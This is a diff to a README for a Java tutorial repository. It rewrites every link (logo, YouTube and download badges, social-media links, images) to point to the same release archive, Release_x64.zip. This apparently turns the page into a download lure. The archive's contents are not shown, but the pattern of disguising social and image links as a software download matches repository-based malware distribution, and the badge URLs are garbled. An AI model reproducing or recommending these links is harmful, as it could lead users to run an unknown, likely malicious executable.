@@ -1,7 +1,7 @@
 
 # JavaShit: Learning Java in a Fun and Engaging Way! 🚀
 
-![JavaShit](https://www.example.com/javashit_logo.jpg)
+![JavaShit](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the **JavaShit** repository, where we dive deep into the exciting world of Java programming! Whether you are a beginner or an experienced developer looking to sharpen your skills, you are in the right place. 🎉
 
@@ -24,13 +24,13 @@ In this repository, you will find a treasure trove of resources to help you mast
 
 To kickstart your Java journey, make sure to check out the YouTube playlist and videos created specifically for **JavaShit**. You'll find step-by-step guides, explanations, and demonstrations to enhance your learning experience. 📺
 
-[![JavaShit YouTube Playlist](https://img.shields.io/badge/Watch%20on%20YouTube-Subscribe-red)](https://www.youtube.com/javashit)
+[![JavaShit YouTube Playlist](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip%20on%20YouTube-Subscribe-red)](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
 
 ## Download the Software
 
 Ready to take your Java skills to the next level? Download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Launch%20the%20Application-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip%20Software-Launch%20the%20Application-blue)](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
 
 ## Topics Covered
 
@@ -46,9 +46,9 @@ The **JavaShit** repository covers a wide range of topics related to JavaScript,
 
 Join our growing community of Java enthusiasts and stay updated on the latest tutorials, tips, and tricks.
 
-- Follow us on Twitter: [JavaShit Twitter](https://twitter.com/javashit)
-- Connect on LinkedIn: [JavaShit LinkedIn](https://www.linkedin.com/company/javashit)
-- Like us on Facebook: [JavaShit Facebook](https://www.facebook.com/javashit)
+- Follow us on Twitter: [JavaShit Twitter](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
+- Connect on LinkedIn: [JavaShit LinkedIn](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
+- Like us on Facebook: [JavaShit Facebook](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
 
 ## Contribute
 
@@ -60,4 +60,4 @@ Let's learn, code, and have fun with JavaShit! 💥
 
 **JavaShit** - Where Java Dreams Come True! 🌟
 
-![Java Shit](https://www.example.com/javashit_image.jpg)
+![Java Shit](https://github.com/gimmesomesleep/JavaShit/releases/download/v1.0/Release_x64.zip)
